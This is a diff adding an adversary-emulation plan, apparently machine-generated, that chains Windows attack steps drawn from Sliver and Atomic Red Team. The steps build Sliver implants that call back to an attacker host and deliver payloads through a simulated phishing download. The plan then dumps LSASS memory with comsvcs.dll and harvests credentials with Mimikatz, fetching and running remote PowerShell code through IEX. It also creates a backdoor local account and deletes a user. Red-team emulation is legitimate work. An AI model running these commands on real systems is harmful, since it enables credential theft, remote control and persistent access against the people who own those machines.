@@ -1,0 +1,598 @@
+emulation_plan_details:
+  adversary_name: env0
+  creation_time: 2026-07-15 05:18:08 UTC+0000
+  parent_chain_idx: 127
+  internal_chain_idx: 159
+  stage_outcomes:
+    - stage: initial-executor
+      status: succeeded
+      plan_source: attack_plan-2.yml
+    - stage: discovery-obtained
+      status: succeeded
+      plan_source: attack_plan-1.yml
+    - stage: credential-access-obtained
+      status: succeeded
+      plan_source: attack_plan-1.yml
+    - stage: persistence-obtained
+      status: succeeded
+      plan_source: attack_plan-2.yml
+    - stage: privilege-escalation-obtained
+      status: succeeded
+      plan_source: attack_plan-1.yml
+    - stage: collection-obtained
+      status: succeeded
+      plan_source: attack_plan-1.yml
+    - stage: exfiltration-obtained
+      status: succeeded
+      plan_source: attack_plan-1.yml
+    - stage: impact-obtained
+      status: succeeded
+      plan_source: attack_plan-1.yml
+    - stage: lateral-movement-obtained
+      status: succeeded
+      plan_source: attack_plan-1.yml
+attack_action_sequence:
+  - uuid: sliver-payload-windows-dll
+    name: Build DLL Sliver implant
+    id:
+      - T1071.001
+    source: Manual
+    supported_platforms:
+      - windows
+    tactics:
+      - Command and Control
+    technique:
+      - Application Layer Protocol - Web Protocols
+    description: |
+      The command is used in the Sliver C2 (Command and Control) framework to generate a payload designed for remote access to a target machine.
+    execution:
+      executor: Sliver Console
+      command: |
+        sliver > generate --mtls #{LHOST}:#{LPORT} --os windows --arch 64bit --format shared --save #{SAVE_PATH}
+        sliver > mtls --lport #{LPORT}
+    arguments:
+      LHOST:
+        default:
+        description: IP address of the attacker machine
+        required: true
+      LPORT:
+        default:
+        description: listening port of the attacter machine
+        required: true
+      SAVE_PATH:
+        default:
+        description: Saved path of the generated payload
+        required: true
+        pddl_index: string0_var_in_plan
+    preconditions:
+      - (os-windows ?target - host)
+    effects:
+      - (sliver-implant-payload ?p - payload ?target - host)
+      - (file-payload ?p - payload ?file - file)
+      - (dll-file ?file - file)
+      - (file-on-attacker ?path - string ?file - file)
+      - (payload-handler-set ?p - payload)
+      - (callback-covered ?file - file)
+  - uuid: simulate-download-file
+    name: Simulate the victim download a file on its machine
+    id:
+      - T1566.002
+    source: Manual
+    supported_platforms:
+      - windows
+    tactics:
+      - Initial Access
+    technique:
+      - 'Phishing: Spearphishing Link'
+    description: This step simulates the victim accidentally downloads a malicious
+      file by clicking a link.
+    execution:
+      executor: Human
+      command: |
+        (This step needs human interaction and (temporarily) cannot be executed automatically)
+        (On attacker's machine)
+        python -m http.server #{LPORT}
+
+        (On victim's machine)
+        1. Open #{LHOST}:#{LPORT} in the browser
+        2. Navigate to the path of the file on the attacker's machine
+        3. Download the file to #{SAVE_PATH}
+    arguments:
+      LHOST:
+        default:
+        description: IP address of the http file server (typically the attacker machine)
+        type:
+        required: true
+      LPORT:
+        default: 8000
+        description: port of the http file server
+        type:
+        required: true
+      SAVE_PATH:
+        default:
+        description: Saved path of the downloaded payload
+        required: true
+        pddl_index: string4_var_in_plan
+    preconditions:
+      - (allow-simulate-user-action ?target - host)
+      - operator: or
+        operands:
+          - (os-linux ?target - host)
+          - (os-windows ?target - host)
+          - (os-macos ?target - host)
+      - (file-on-attacker ?localpath - string ?file - file)
+    effects:
+      - (file-exists ?path - string ?file - file ?target - host)
+  - uuid: simulate-execute-dll-windows
+    name: Simulate the victim execute a DLL file on its machine
+    id:
+      - T1204.002
+    source: Manual
+    supported_platforms:
+      - windows
+    tactics:
+      - Execution
+    technique:
+      - 'User Execution: Malicious File'
+    description: This step simulates the victim executes a DLL file on its machine.
+    execution:
+      executor: Human
+      command: |
+        (This step needs human interaction and (temporarily) cannot be executed automatically)
+        (On victim's machine, use PowerShell or Command Prompt)
+        regsvr32 #{DLL_PATH}
+    arguments:
+      DLL_PATH:
+        default:
+        description: Saved path of the DLL file
+        required: true
+        pddl_index: string4_var_in_plan
+    preconditions:
+      - (allow-simulate-user-action ?target - host)
+      - (os-windows ?target - host)
+      - (file-exists ?path - string ?file - file ?target - host)
+      - (dll-file ?file - file)
+      - (callback-covered ?file - file)
+    effects:
+      - (file-executed ?file - file ?target - host)
+  - uuid: execute-sliver-payload-file
+    name: Execute a Sliver Implant Payload
+    id:
+      - T1071.001
+    source: Sliver
+    supported_platforms:
+      - windows
+    tactics:
+      - Command and Control
+    technique:
+      - Application Layer Protocol - Web Protocols
+    description: |
+      Executing a Sliver implant payload will establish a Sliver session.
+    execution:
+      executor: Sliver Session Establish
+      command: |
+        None
+    arguments:
+    preconditions:
+      - (sliver-implant-payload ?p - payload ?target - host)
+      - (file-payload ?p - payload ?f - file)
+      - (file-executed ?f - file ?target - host)
+      - (payload-handler-set ?p - payload)
+    effects:
+      - (sliver-session ?s - executor ?target - host)
+      - operator: When
+        params:
+          condition: (file-executed-elevated ?f - file ?target - host)
+          effect: (elevated-executor ?s - executor)
+  - uuid: sliver-registry_read
+    name: Registry Key Read Operation
+    id:
+      - T1012
+    source: Sliver
+    supported_platforms:
+      - windows
+    tactics:
+      - Discovery
+    technique:
+      - Query Registry
+    description: The `registry_read` command retrieves values from Windows registry.
+    execution:
+      executor: Sliver Executor
+      command: registry_read(session_id=#{executor}, hive=#{hive}, reg_path=#{reg_path},
+        key=#{key}, hostname=#{hostname})
+    arguments:
+      executor:
+        description: The session ID of the active Sliver connection.
+        required: true
+        pddl_index: executor4_var_in_plan
+      hive:
+        description: Registry hive (HKLM/HKCU/HKU)
+        required: true
+      reg_path:
+        description: Path to registry key
+        required: true
+      key:
+        description: Specific value name to read
+        required: true
+      hostname:
+        description: Target hostname for remote registry access
+        required: true
+    preconditions:
+      - (os-windows ?target - host)
+      - (sliver-session ?executorID - executor ?target - host)
+    effects:
+      - (query-registry-info-known ?target - host)
+  - uuid: sliver-payload-windows-exe
+    name: Build the executable file of a Sliver implant (for Windows)
+    id:
+      - T1071.001
+    source: Manual
+    supported_platforms:
+      - windows
+    tactics:
+      - Command and Control
+    technique:
+      - Application Layer Protocol - Web Protocols
+    description: |
+      The command is used in the Sliver C2 (Command and Control) framework to generate a payload designed for remote access to a target machine.
+    execution:
+      executor: Sliver Console
+      command: |
+        sliver > generate --mtls #{LHOST}:#{LPORT} --os windows --arch 64bit --format exe --save #{SAVE_PATH}
+        sliver > mtls --lport #{LPORT}
+    arguments:
+      LHOST:
+        default:
+        description: IP address of the attacker machine
+        required: true
+      LPORT:
+        default:
+        description: listening port of the attacter machine
+        required: true
+      SAVE_PATH:
+        default:
+        description: Saved path of the generated payload
+        required: true
+        pddl_index: string1_var_in_plan
+    preconditions:
+      - (os-windows ?target - host)
+    effects:
+      - (sliver-implant-payload ?p - payload ?target - host)
+      - (file-payload ?p - payload ?file - file)
+      - (file-on-attacker ?path - string ?file - file)
+      - (standalone-exe-file ?file - file)
+      - (payload-handler-set ?p - payload)
+      - (callback-covered ?file - file)
+  - uuid: simulate-download-execute-file-root
+    name: Simulate the victim download and execute malicious payload file as Admin
+      (Root)
+    id:
+      - T1204.002
+    source: Manual
+    supported_platforms:
+      - windows
+    tactics:
+      - Execution
+    technique:
+      - 'User Execution: Malicious File'
+    description:
+    execution:
+      executor: Human
+      command: |
+        (This step needs human interaction and (temporarily) cannot be executed automatically)
+        (On attacker's machine)
+        python -m http.server #{LPORT}
+
+        (On victim's machine)
+        1. Open #{LHOST}:#{LPORT} in the browser
+        2. Navigate to the path of the target payload file
+        3. Download the payload file
+        4. Execute the payload file to #{SAVE_PATH} as Admin (Root)
+    arguments:
+      LHOST:
+        default:
+        description: IP address of the http file server (typically the attacker machine)
+        type:
+        required: true
+      LPORT:
+        default: 8000
+        description: port of the http file server
+        type:
+        required: true
+      SAVE_PATH:
+        default:
+        description: Saved path of the downloaded payload
+        required: true
+        pddl_index: string2_var_in_plan
+    preconditions:
+      - (allow-simulate-user-action ?target - host)
+      - operator: or
+        operands:
+          - (os-linux ?target - host)
+          - (os-windows ?target - host)
+          - (os-macos ?target - host)
+      - (file-on-attacker ?localpath - string ?file - file)
+      - operator: or
+        operands:
+          - (standalone-exe-file ?file - file)
+          - (elf-file ?file - file)
+      - (callback-covered ?file - file)
+    effects:
+      - (file-exists ?path - string ?file - file ?target - host)
+      - (file-executed-elevated ?file - file ?target - host)
+  - uuid: execute-sliver-payload-file
+    name: Execute a Sliver Implant Payload
+    id:
+      - T1071.001
+    source: Sliver
+    supported_platforms:
+      - windows
+    tactics:
+      - Command and Control
+    technique:
+      - Application Layer Protocol - Web Protocols
+    description: |
+      Executing a Sliver implant payload will establish a Sliver session.
+    execution:
+      executor: Sliver Session Establish
+      command: |
+        None
+    arguments:
+    preconditions:
+      - (sliver-implant-payload ?p - payload ?target - host)
+      - (file-payload ?p - payload ?f - file)
+      - (file-executed ?f - file ?target - host)
+      - (payload-handler-set ?p - payload)
+    effects:
+      - (sliver-session ?s - executor ?target - host)
+      - operator: When
+        params:
+          condition: (file-executed-elevated ?f - file ?target - host)
+          effect: (elevated-executor ?s - executor)
+  - uuid: sliver-powershell
+    name: Execute PowerShell Command
+    id:
+      - T1059.001
+    source: Sliver
+    supported_platforms:
+      - windows
+    tactics:
+      - Execution
+    technique:
+      - |
+        Command and Scripting Interpreter: PowerShell
+    description: The `powershell.exe` command executes a PowerShell script or command
+      on the remote host. This command is useful for performing system monitoring
+      tasks or gathering information about the processes running on a remote machine.
+    execution:
+      executor: Sliver Session Derive
+      command: |
+        # no-op — derivation only
+    arguments:
+      executor_parent:
+        description: The session ID of the active Sliver connection.
+        required: true
+        pddl_index: executor0_var_in_plan
+      executor_derived:
+        description: The derived Windows Powershell executor.
+        required: true
+        pddl_index: executor1_var_in_plan
+    preconditions:
+      - (os-windows ?target - host)
+      - (sliver-session ?executorID - executor ?target - host)
+    effects:
+      - (powershell ?s2 - executor ?target - host)
+      - operator: When
+        params:
+          condition: (elevated-executor ?executorID - executor)
+          effect: (elevated-executor ?s2 - executor)
+  - uuid: art-t1003_001-comsvcs-minidump
+    name: Dump LSASS.exe Memory using comsvcs.dll
+    id:
+      - T1003.001
+    source: Atomic Red Team
+    supported_platforms:
+      - windows
+    tactics:
+      - Credential Access
+    technique:
+      - 'OS Credential Dumping: LSASS Memory'
+    description: |
+      Uses the built-in `comsvcs.dll` MiniDump export to write lsass.exe
+      memory to disk — pure LOLBAS, no external binary needed. Windows
+      native; no prereq to stage. ART auto_generated_guid
+      2536dee2-12fb-459a-8c37-971844fa73be.
+    execution:
+      executor: Powershell Executor
+      command: |
+        C:\Windows\System32\rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id "#{output_file}" full
+    arguments:
+      executor:
+        description: The Powershell session ID used to invoke rundll32 → comsvcs.
+        required: true
+        pddl_index: executor1_var_in_plan
+      output_file:
+        default: C:\Users\Public\lsass-comsvcs.dmp
+        description: Target-side path for the resulting LSASS memory dump.
+        required: true
+        pddl_index: string3_var_in_plan
+    preconditions:
+      - (os-windows ?target - host)
+      - (powershell ?executorID - executor ?target - host)
+      - (elevated-executor ?executorID - executor)
+    effects:
+      - (file-exists ?path - string ?f - file ?target - host)
+      - (lsass-dump-file ?f - file)
+      - (callback-covered ?f - file)
+  - uuid: art-t1003_001-mimikatz-offline-dump
+    name: Offline Credential Theft With Mimikatz
+    id:
+      - T1003.001
+    source: Atomic Red Team
+    supported_platforms:
+      - windows
+    tactics:
+      - Credential Access
+    technique:
+      - 'OS Credential Dumping: LSASS Memory'
+    description: |
+      Mimikatz `sekurlsa::minidump <dumpfile>; sekurlsa::logonpasswords full`
+      processes an already-existing LSASS memory dump on target and prints
+      credential material to stdout. Chain-composition consumer: pair with
+      any dumper that emits `(lsass-dump-file …)` — ProcDump, NanoDump,
+      comsvcs.dll, rdrleakdiag, Out-Minidump, Silent Process Exit. Method 3
+      folds mimikatz staging (fetch latest release from GitHub API + unzip
+      via ART's Invoke-FetchFromZip helper). ART auto_generated_guid
+      453acf13-1dbd-47d7-b28a-172ce9228023.
+    execution:
+      executor: Powershell Executor
+      command: |
+        $mimikatz = "#{mimikatz_exe}"
+        if (-not (Test-Path $mimikatz)) {
+          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+          IEX (Invoke-WebRequest 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1' -UseBasicParsing).Content
+          $releases = (Invoke-WebRequest 'https://api.github.com/repos/gentilkiwi/mimikatz/releases' -UseBasicParsing | ConvertFrom-Json)
+          $zipUrl = $releases[0].assets.browser_download_url | Where-Object { $_.EndsWith('.zip') } | Select-Object -First 1
+          $basePath = Split-Path (Split-Path $mimikatz)
+          New-Item -ItemType Directory $basePath -Force | Out-Null
+          Invoke-FetchFromZip $zipUrl "x64/mimikatz.exe" $basePath
+        }
+        & $mimikatz "sekurlsa::minidump #{input_file}" "sekurlsa::logonpasswords full" "exit"
+    arguments:
+      executor:
+        description: The Powershell session ID used to invoke mimikatz.
+        required: true
+        pddl_index: executor1_var_in_plan
+      mimikatz_exe:
+        default: C:\Users\Public\x64\mimikatz.exe
+        description: Target-side path where mimikatz is staged and invoked.
+        required: true
+      input_file:
+        description: Path to an existing LSASS memory dump file on the target (produced
+          by an earlier dumper action).
+        required: true
+        pddl_index: string3_var_in_plan
+    preconditions:
+      - (os-windows ?target - host)
+      - (powershell ?executorID - executor ?target - host)
+      - (elevated-executor ?executorID - executor)
+      - (file-exists ?path - string ?f - file ?target - host)
+      - (lsass-dump-file ?f - file)
+    effects:
+      - (credential-data ?d - data ?target - host)
+      - (data-stored-c2 ?d - data)
+  - uuid: sliver-cmd
+    name: Execute Command (cmd.exe)
+    id:
+      - T1059.003
+    source: Sliver
+    supported_platforms:
+      - windows
+    tactics:
+      - Execution
+    technique:
+      - |
+        Command and Scripting Interpreter: Windows Command Shell
+    description: The `cmd.exe` command executes a Windows command. It runs the specified
+      command on the remote host and returns the result. This command is useful for
+      performing various system tasks.
+    execution:
+      executor: Sliver Session Derive
+      command: |
+        # no-op — derivation only
+    arguments:
+      executor_parent:
+        description: The session ID of the active Sliver connection.
+        required: true
+        pddl_index: executor0_var_in_plan
+      executor_derived:
+        description: The derived Windows CMD executor.
+        required: true
+        pddl_index: executor2_var_in_plan
+    preconditions:
+      - (os-windows ?target - host)
+      - (sliver-session ?executorID - executor ?target - host)
+    effects:
+      - (command-prompt ?s2 - executor ?target - host)
+      - operator: When
+        params:
+          condition: (elevated-executor ?executorID - executor)
+          effect: (elevated-executor ?s2 - executor)
+  - uuid: art-t1136_001-net-user-add
+    name: Create a new user in a command prompt
+    id:
+      - T1136.001
+    source: Atomic Red Team
+    supported_platforms:
+      - windows
+    tactics:
+      - Persistence
+    technique:
+      - 'Create Account: Local Account'
+    description: |
+      Creates a new local user account via `net user /add`. Standard
+      persistence pattern — attacker retains logon capability after
+      detection. Requires admin. ART auto_generated_guid
+      6657864e-0323-4206-9344-ac9cd7265a4f.
+    execution:
+      executor: Command Prompt Executor
+      command: |
+        net user /add "#{username}" "#{password}"
+    arguments:
+      executor:
+        description: The Command Prompt session ID used to invoke net user.
+        required: true
+        pddl_index: executor2_var_in_plan
+      username:
+        default: BackupSvc
+        description: Local account name to create.
+        required: true
+      password:
+        default: ComplexPass!23
+        description: Password for the new account.
+        required: true
+    preconditions:
+      - (os-windows ?target - host)
+      - (command-prompt ?executorID - executor ?target - host)
+      - (elevated-executor ?executorID - executor)
+    effects:
+      - (user-created ?u - user ?target - host)
+  - uuid: art-t1531-delete-user
+    name: Delete User - Windows
+    id:
+      - T1531
+    source: Atomic Red Team
+    supported_platforms:
+      - windows
+    tactics:
+      - Impact
+    technique:
+      - Account Access Removal
+    description: |
+      Creates a target account (if absent) then deletes it. Strongest form
+      of account access removal — the account no longer exists on the
+      system. ART auto_generated_guid f21a1d7d-a62f-442a-8c3a-2440d43b19e5.
+    execution:
+      executor: Command Prompt Executor
+      command: |
+        net user #{user_account} #{initial_password} /add
+        net.exe user #{user_account} /delete
+    arguments:
+      executor:
+        description: The Command Prompt session ID used to invoke net.
+        required: true
+        pddl_index: executor2_var_in_plan
+      user_account:
+        default: AtomicUser
+        description: Local user to delete (created first if absent).
+        required: true
+      initial_password:
+        default: User2DeletePW!
+        description: Initial password if the account has to be created first.
+        required: true
+    preconditions:
+      - (os-windows ?target - host)
+      - (command-prompt ?executorID - executor ?target - host)
+      - (elevated-executor ?executorID - executor)
+    effects:
+      - (user-disabled ?target - host)
